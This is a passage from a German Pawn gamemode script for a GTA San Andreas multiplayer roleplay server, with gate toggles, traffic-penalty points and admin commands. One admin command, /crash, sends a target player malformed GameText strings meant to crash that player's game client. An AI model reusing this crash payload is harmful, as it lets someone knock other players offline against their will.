	if(IsPlayerInRangeOfPoint(playerid,5,1778.10,-1142.40,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[80] == 0)
		{
			MoveDynamicObject(tor[80],1778.10,-1142.40,25.10 + 5,1);
			torstatus[80] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[80],1778.10,-1142.40,25.10,1);
		torstatus[80] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1726.70,-1142.40,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[81] == 0)
		{
			MoveDynamicObject(tor[81],1726.70,-1142.40,25.10 + 5,1);
			torstatus[81] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[81],1726.70,-1142.40,25.10,1);
		torstatus[81] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1732.50,-1142.40,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[82] == 0)
		{
			MoveDynamicObject(tor[82],1732.50,-1142.40,25.10 + 5,1);
			torstatus[82] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[82],1732.50,-1142.40,25.10,1);
		torstatus[82] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1744.00,-1142.40,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[83] == 0)
		{
			MoveDynamicObject(tor[83],1744.00,-1142.40,25.10 + 5,1);
			torstatus[83] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[83],1744.00,-1142.40,25.10,1);
		torstatus[83] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1749.70,-1142.40,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[84] == 0)
		{
			MoveDynamicObject(tor[84],1749.70,-1142.40,25.10 + 5,1);
			torstatus[84] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[84],1749.70,-1142.40,25.10,1);
		torstatus[84] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1709.70,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[85] == 0)
		{
			MoveDynamicObject(tor[85],1709.70,-1094.90,25.10 + 5,1);
			torstatus[85] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[85],1709.70,-1094.90,25.10,1);
		torstatus[85] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1726.60,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[86] == 0)
		{
			MoveDynamicObject(tor[86],1726.60,-1094.90,25.10 + 5,1);
			torstatus[86] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[86],1726.60,-1094.90,25.10,1);
		torstatus[86] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1732.60,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[87] == 0)
		{
			MoveDynamicObject(tor[87],1732.60,-1094.90,25.10 + 5,1);
			torstatus[87] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[87],1732.60,-1094.90,25.10,1);
		torstatus[87] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1743.70,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[88] == 0)
		{
			MoveDynamicObject(tor[88],1743.70,-1094.90,25.10 + 5,1);
			torstatus[88] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[88],1743.70,-1094.90,25.10,1);
		torstatus[88] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1749.70,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[89] == 0)
		{
			MoveDynamicObject(tor[89],1749.70,-1094.90,25.10 + 5,1);
			torstatus[89] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[89],1749.70,-1094.90,25.10,1);
		torstatus[89] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1760.90,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[90] == 0)
		{
			MoveDynamicObject(tor[90],1760.90,-1094.90,25.10 + 5,1);
			torstatus[90] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[90],1760.90,-1094.90,25.10,1);
		torstatus[90] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1766.70,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[91] == 0)
		{
			MoveDynamicObject(tor[91],1766.70,-1094.90,25.10 + 5,1);
			torstatus[91] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[91],1766.70,-1094.90,25.10,1);
		torstatus[91] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1778.30,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[92] == 0)
		{
			MoveDynamicObject(tor[92],1778.30,-1094.90,25.10 + 5,1);
			torstatus[92] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[92],1778.30,-1094.90,25.10,1);
		torstatus[92] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1784.10,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[93] == 0)
		{
			MoveDynamicObject(tor[93],1784.10,-1094.90,25.10 + 5,1);
			torstatus[93] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[93],1784.10,-1094.90,25.10,1);
		torstatus[93] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1795.40,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[94] == 0)
		{
			MoveDynamicObject(tor[94],1795.40,-1094.90,25.10 + 5,1);
			torstatus[94] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[94],1795.40,-1094.90,25.10,1);
		torstatus[94] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1801.10,-1094.90,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
		{
		if(torstatus[95] == 0)
		{
			MoveDynamicObject(tor[95],1801.10,-1094.90,25.10 + 5,1);
			torstatus[95] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[95],1801.10,-1094.90,25.10,1);
		torstatus[95] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}














	return 1;
	}


	new playermoney;
	new sendername[MAX_PLAYER_NAME];
	new giveplayer[MAX_PLAYER_NAME];
	new playername[MAX_PLAYER_NAME];
	new cmd[256];
	new tmp[256];
	new giveplayerid, moneys, idx;
	new dancestyle;
	cmd = strtoknew(cmdtext, idx);
    GetPlayerName(playerid,sendername,sizeof(sendername));
	dcmd(arbobjid,8,cmdtext);
	dcmd(arb,3,cmdtext);
	dcmd(deletearb,9,cmdtext);



	dcmd(deletearbfor,12,cmdtext);
	dcmd(arball,6,cmdtext);
	dcmd(arbforall,9,cmdtext);
	dcmd(arbobj,6,cmdtext);


	if(strcmp(cmd,"/punkte",true)==0)
	{
		if(PlayerInfo[playerid][sMember] == 24 || PlayerInfo[playerid][sMember] == 1 || PlayerInfo[playerid][sMember] == 2 || PlayerInfo[playerid][sMember] == 3 || PlayerInfo[playerid][sMember] == 22)
		{
		    if(PlayerInfo[playerid][pRank] <= 3)
		    {
		        SendClientMessage(playerid, COLOR_GRAD2,"Du kannst mit deinen Rang noch keine Punkte vergeben!");
		        return 1;
			}
		    tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "BEFEHL:/punkte [Spieler][Anzahl][Grund]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			new tmp2[64];
			new sendername2[MAX_PLAYER_NAME];
			tmp2 = strtoknew(cmdtext, idx);
			if(!strlen(tmp2))
			{
				SendClientMessage(playerid, COLOR_GRAD2, " BEFEHL:/punkte [Spieler][Anzahl][Grund]");
				return 1;
			}
			if(giveplayerid != INVALID_PLAYER_ID)
			{
			    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername2, sizeof(sendername2));
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
				{
					idx++;
				}
				new offset = idx;
				new result[64];
				while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
				{
					result[idx - offset] = cmdtext[idx];
					idx++;
				}
				result[idx - offset] = EOS;
				if(!strlen(result))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "BEFEHL:/punkte [Spieler][Anzahl][Grund]");
					return 1;
				}
				if(strlen(tmp2) > 0 && strlen(tmp2) < 12)
				{
					new stringcargiver[256];
					format(stringcargiver,sizeof(stringcargiver),"Du hast %s %s Strafpunkte eingetragen, Grund: %s.",giveplayer,tmp2,result);
					new stringcarowner[256];
					format(stringcarowner,sizeof(stringcarowner),"%s hat dir %s Strafpunkte eingetragen, Grund: %s.",sendername2,tmp2,result);
					new stringcargivennews[256];
					format(stringcargivennews,sizeof(stringcargivennews),"HQ: Officer %s hat %s %s Strafpunkte eingetragen, Grund: %s.",sendername2,giveplayer,tmp2,result);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,stringcargiver);
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE,stringcarowner);
					printf(stringcargivennews);
					PlayerInfo[giveplayerid][pCarP] += strval(tmp2);
					for(new i = 0; i<MAX_PLAYERS; i++)
					{
					    if(IsACop(i) || PlayerInfo[i][pMember] == 24 || PlayerInfo[i][pLeader] == 24)
					    {
					            SendClientMessage(i,COLOR_DBLUE,stringcargivennews);
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD2,"Du musst eine Zahl zwischen 1 und 12 wählen!");
				    return 1;
				}
				if(PlayerInfo[giveplayerid][pCarP] < 0)
				{
				    PlayerInfo[giveplayerid][pCarP] = 0;
				}
				if(PlayerInfo[giveplayerid][pCarP] >= 12)
				{
				    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE,"Dein Führerschein wurde Entzogen da du mehr wie 12 Strafpunkte hast!");
					PlayerInfo[giveplayerid][pCarLic] = 0;
					PlayerInfo[giveplayerid][pCarP] = 0;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD2,"Dieser Spieler ist nicht auf dem Server!");
				return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD2,"Du bist kein FBI/Polizist oder Ordnungsbeamter über Rang 4!");
		    return 1;
		}
		return 1;
	}
	if(strcmp(cmd, "/crash", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Benutze: /crash [SpielerID]");
			    return 1;
			}
			giveplayerid = ReturnUser(tmp);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			if (PlayerInfo[playerid][pAdmin] >= 2002)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
/*
			    		if(IsASkrupy(giveplayerid))
	  		   			{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht bannen, da er der Owner ist!");
							return 1;
						}*/

			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
						GameTextForPlayer(giveplayerid, "•¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 1000, 0);
						GameTextForPlayer(giveplayerid, "•¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 2000, 1);
						GameTextForPlayer(giveplayerid, "•¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 3000, 2);
						GameTextForPlayer(giveplayerid, "•¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 4000, 3);
						GameTextForPlayer(giveplayerid, "•¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 5000, 4);
						GameTextForPlayer(giveplayerid, "•¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 6000, 5);
						GameTextForPlayer(giveplayerid, "•¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 7000, 6);
						format(string, sizeof(string), "AdmCmd %s(%d) hat %s(%d) Spiel zum abstürzen gebracht.", sendername,playerid,giveplayer,giveplayerid);
				  		ABroadCast(COLOR_LIGHTRED, string,1);

						return 1;
					}
					else
					{
					    format(string, sizeof(string), "ungültiger Spieler", giveplayerid);
					    SendClientMessage(playerid, COLOR_GRAD1, string);
					}
				}
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/burn", true) == 0)
	{
		tmp = strtoknew(cmdtext, idx);
		if(!strlen(tmp) && PlayerInfo[playerid][pAdmin] >= 3)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Benutze: /burn [SpielerID]");
			return 1;
		}
		giveplayerid = strval(tmp);
		GetPlayerName(playerid, sendername, sizeof(sendername));
		GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[playerid][pAdmin] >= 4)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
			        new targetlevel = PlayerInfo[giveplayerid][pAdmin];
					new playerlevel = PlayerInfo[playerid][pAdmin];
					if(targetlevel > playerlevel) return SendClientMessage(playerid, COLOR_RED, "Sie könne diesen Befehl nicht bei dieser Person nutzen.");
					format(string, sizeof(string), "[ADMIN]: %s(%d) hat %s(%d) angezündet.",sendername,playerid,giveplayer,giveplayerid);
					ABroadCast(COLOR_LIGHTRED,string, 1);
					new Float:boomx, Float:boomy, Float:boomz;
					GetPlayerPos(giveplayerid,boomx, boomy, boomz);
					CreateExplosion(boomx, boomy , boomz, 1, 1);
					new y, m, d;
					new h,mi,s;
					getdate(y,m,d);
					gettime(h,mi,s);

				}
				else
				{
				    format(string, sizeof(string), "%d ungültiger Spieler", giveplayerid);
					SendClientMessage(playerid, COLOR_RED, string);
				}
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/agangunjail",true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] < 2)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Admin !");
	            return 1;
	        }
	        tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /agangunjail [playerid]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
		    if(IsPlayerConnected(giveplayerid))
		    {
		        if(giveplayerid != INVALID_PLAYER_ID)
		        {
					format(string, sizeof(string), "* Du hast %s aus dem Knast Freigelassen!", GetName(giveplayerid));
					SendClientMessage(playerid, COLOR_RED, string);
					format(string, sizeof(string), "* Du wurdest von %s aus dem Knast Freigelassen!", GetName(playerid));
					SendClientMessage(giveplayerid, COLOR_RED, string);
					ResetPlayerWeapons(giveplayerid);
					SetPlayerInterior(giveplayerid,0);
					SetPlayerVirtualWorld(giveplayerid, 0);
                    SetPlayerPos(giveplayerid, 1554.7799,-1675.5459,16.1953);
					PlayerInfo[giveplayerid][pGangJailed] = 0;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht online!");
			    return 1;
			}
	    }
	    return 1;
	}
	if(strcmp(cmd, "/unjail",true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] < 2001)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Admin !");
	            return 1;
	        }
	        tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /unjail [playerid]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
		    if(IsPlayerConnected(giveplayerid))
		    {
		        if(giveplayerid != INVALID_PLAYER_ID)
		        {
					format(string, sizeof(string), "* Du hast %s aus dem Knast Freigelassen!", GetName(giveplayerid));
					SendClientMessage(playerid, COLOR_RED, string);
					format(string, sizeof(string), "* Du wurdest von %s aus dem Knast Freigelassen!", GetName(playerid));
					SendClientMessage(giveplayerid, COLOR_RED, string);
					WantedPoints[giveplayerid] = 0;
					WantedLevel[giveplayerid] = 0;
//					SetPlayerWantedLevel(giveplayerid,0);
					ResetPlayerWeapons(giveplayerid);
					PlayerInfo[giveplayerid][pJailed] = 0;
					PlayerInfo[giveplayerid][pJailTime] = 0;
                    SetPlayerSpawn(giveplayerid);
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht online!");
			    return 1;
			}
	    }
	    return 1;
	}
	if(strcmp(cmd, "/am", true) == 0 || strcmp(cmd, "/suptext", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: (/am TEXT");
				return 1;
			}

            	if (PlayerInfo[playerid][pAdmin] > 2)
                	{


            	if(PlayerInfo[playerid][pAdmin] == 2)
                	{
					format(string, sizeof(string), "** Supporter %s: %s", sendername, result);
					ProxDetector(100.0, playerid, string,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE);
				}
            	if(PlayerInfo[playerid][pAdmin] == 4)
				{
					format(string, sizeof(string), "** Supporter %s: %s", sendername, result);
					ProxDetector(100.0, playerid, string,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE);
				}
            	if(PlayerInfo[playerid][pAdmin] == 1337)
				{
					format(string, sizeof(string), "** Moderator %s: %s", sendername, result);
				    ProxDetector(100.0, playerid, string,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE);
				}
            	if(PlayerInfo[playerid][pAdmin] == 1338)
				{
					format(string, sizeof(string), "** Administrator %s: %s", sendername, result);
				    ProxDetector(100.0, playerid, string,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE);
				}
            	if(PlayerInfo[playerid][pAdmin] == 2000)
				{
					format(string, sizeof(string), "** Head-Admin %s: %s", sendername, result);
				    ProxDetector(100.0, playerid, string,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE);
				}
            	if(PlayerInfo[playerid][pAdmin] == 2001)
				{
					format(string, sizeof(string), "** Projektleitung %s: %s", sendername, result);
				    ProxDetector(100.0, playerid, string,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE);
				}
            	if(PlayerInfo[playerid][pAdmin] == 2002)
				{
					format(string, sizeof(string), "** Projektleitung %s: %s", sendername, result);
				    ProxDetector(100.0, playerid, string,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE);
				}
            	if(PlayerInfo[playerid][pAdmin] >= 2005)
				{
					format(string, sizeof(string), "** UC-Admin: %s", result);
				    ProxDetector(100.0, playerid, string,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE,COLOR_ORANGE);
				}
				printf("%s", string);
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD2, "Du bist kein Admin !");
				return 1;
			}
		}
		return 1;
	}
    if(strcmp(cmd, "/houseid", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] >= 4)
	        {
	    	for(new i = 0; i < sizeof(HouseInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
				{
					format(string, sizeof(string), "House: %d", i);
					SendClientMessage(playerid, COLOR_GRAD2, string);
                }
            }
            }
            else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Admin ! ");
	            return 1;
	        }
	    }
	    return 1;
	}

    if(strcmp(cmd, "/bizid", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] >= 4)
	        {
		    	for(new i = 0; i < sizeof(HouseInfo); i++)
				{
					if (IsPlayerInRangeOfPoint(playerid,3.0,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
					{
						format(string, sizeof(string), "Haus: %d", i);
						SendClientMessage(playerid, COLOR_GRAD2, string);
				    }
	            }
		    	for(new i = 0; i < sizeof(BizzInfo); i++)
				{
					if (IsPlayerInRangeOfPoint(playerid,3.0,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]))
					{
						format(string, sizeof(string), "Biz: %d", i);
						SendClientMessage(playerid, COLOR_GRAD2, string);
				    }
	            }
		    	for(new i = 0; i < sizeof(TankeInfo); i++)
				{
					if (IsPlayerInRangeOfPoint(playerid,3.0,TankeInfo[i][tEntranceX], TankeInfo[i][tEntranceY], TankeInfo[i][tEntranceZ]))
					{
						format(string, sizeof(string), "Tanke: %d", i);
						SendClientMessage(playerid, COLOR_GRAD2, string);
				    }
	            }


            }
            else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Admin ! ");
	            return 1;
	        }
	    }
	    return 1;
	}
/*
    if(strcmp(cmd, "/sbizid", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] >= 4)
	        {
		    	for(new i = 0; i < sizeof(SBizzInfo); i++)
				{
					if (IsPlayerInRangeOfPoint(playerid,3.0,SBizzInfo[i][sbEntranceX], SBizzInfo[i][sbEntranceY], SBizzInfo[i][sbEntranceZ]))
					{
						format(string, sizeof(string), "SBiz: %d", i);
